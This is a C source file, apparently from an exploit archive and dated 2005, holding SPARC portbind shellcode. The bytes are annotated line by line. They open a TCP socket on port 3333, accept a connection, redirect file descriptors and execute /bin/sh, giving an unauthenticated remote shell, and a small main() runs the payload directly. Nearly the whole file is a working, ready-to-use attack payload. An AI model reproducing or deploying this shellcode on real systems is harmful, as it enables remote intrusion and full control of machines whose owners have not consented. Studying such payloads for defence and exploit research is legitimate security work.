/*
 * lhall@telegenetic.net
 * portbind shellcode
 * full description of how it was done and defines at
 * http://www.telegenetic.net/sparc-shellcode.htm
 */


char shellcode[]=
"\x9A\x1A\x40\x09" /* xor %o1, %o1, %o5          */
"\x90\x10\x20\x02" /* mov PF_INET, %o0           */
"\x92\x10\x20\x02" /* mov SOCK_STREAM, %o1       */
"\x94\x10\x20\x06" /* mov IPPROTO_TCP, %o2       */
"\x96\x1A\x40\x09" /* xor %o1, %o1, %o3          */
"\x98\x22\x20\x01" /* sub %o0, 1, %o4            */
"\x82\x10\x20\xE6" /* mov SYS_SOCKET, %g1        */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\xA0\x1B\x40\x08" /* xor %o5, %o0, %l0          */
"\xC0\x23\xBF\xF4" /* st  %g0, [%sp - 0xc]       */
"\xA2\x10\x2D\x05" /* mov 3333, %l1              */
"\xE2\x33\xBF\xF2" /* sth %l1, [%sp - 0xe]       */
"\xA2\x10\x20\x02" /* mov AF_INET, %l1           */
"\xE2\x33\xBF\xF0" /* sth %l1, [%sp - 0x10]      */
"\x92\x23\xA0\x10" /* sub %sp, 0x10, %o1         */
"\x94\x10\x20\x10" /* mov SOCKADDR_IN_SIZE, %o2  */
"\x82\x10\x20\xE8" /* mov SYS_BIND, %g1          */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x90\x1B\x40\x10" /* xor %o5, %l0, %o0          */
"\x92\x1B\x40\x0C" /* xor %o5, %o4, %o1          */
"\x94\x1B\x40\x0C" /* xor %o5, %o4, %o2          */
"\x82\x10\x20\xE9" /* mov SYS_LISTEN, %g1        */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\xA2\x10\x20\x10" /* mov SOCKADDR_IN_SIZE, %l1  */
"\xE2\x23\xBF\xDC" /* st %l1, [%sp - 0x24]       */
"\x90\x1B\x40\x10" /* xor %o5, %l0, %o0          */
"\x92\x23\xA0\x20" /* sub %sp, 0x20, %o1         */
"\x94\x23\xA0\x24" /* sub %sp, 0x24, %o2         */
"\x96\x1B\x40\x0C" /* xor %o5, %o4, %o3          */
"\x82\x10\x20\xEA" /* mov SYS_ACCEPT, %g1        */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\xA4\x1B\x40\x08" /* xor %o5, %o0, %l2          */
"\x90\x1B\x40\x0C" /* xor %o5, %o4, %o0          */
"\x82\x10\x20\x06" /* mov SYS_CLOSE, %g1         */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x94\x1B\x40\x0C" /* xor %o5, %o4, %o2          */
"\x94\x02\x80\x0A" /* add %o2, %o2, %o2          */
"\x90\x1B\x40\x0A" /* xor %o5, %o2, %o0          */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x92\x1A\x40\x09" /* xor %o1, %o1, %o1          */
"\x90\x1B\x40\x12" /* xor %o5, %l2, %o0          */
"\x82\x10\x20\x3E" /* mov SYS_FCNTL, %g1         */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x90\x1B\x40\x12" /* xor %o5, %l2, %o0          */
"\x94\x1A\x40\x09" /* xor %o1, %o1, %o2          */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x94\x1B\x40\x0C" /* xor %o5, %o4, %o2          */
"\x90\x1B\x40\x12" /* xor %o5, %l2, %o0          */
"\x91\xD0\x20\x08" /* ta KERNEL                  */
"\x21\x0B\xD8\x9A" /* sethi %hi(0x2f626900), %l0 */
"\xA0\x14\x21\x6E" /* or %l0, %lo(0x16e), %l0    */
"\x23\x0B\xDC\xDA" /* sethi %hi(0x2f736800), %l1 */
"\xE0\x3B\xBF\xF0" /* std %l0, [%sp - 0x10]      */
"\x90\x23\xA0\x10" /* sub %sp, 0x10, %o0         */
"\xD0\x23\xBF\xF8" /* st  %o0, [%sp - 0x8]       */
"\x92\x23\xA0\x08" /* sub %sp, 0x8, %o1          */
"\x94\x1A\x80\x0A" /* xor %o2, %o2, %o2          */
"\x82\x10\x20\x3B" /* mov SYS_EXECVE, %g1        */
"\x91\xD0\x20\x08"; /* ta KERNEL                 */

int
main (int argc, char **argv)
{
       int (*ret)();
       ret = (int(*)())shellcode;
       (int)(*ret)();
       exit(0);
}

// milw0rm.com [2005-11-20]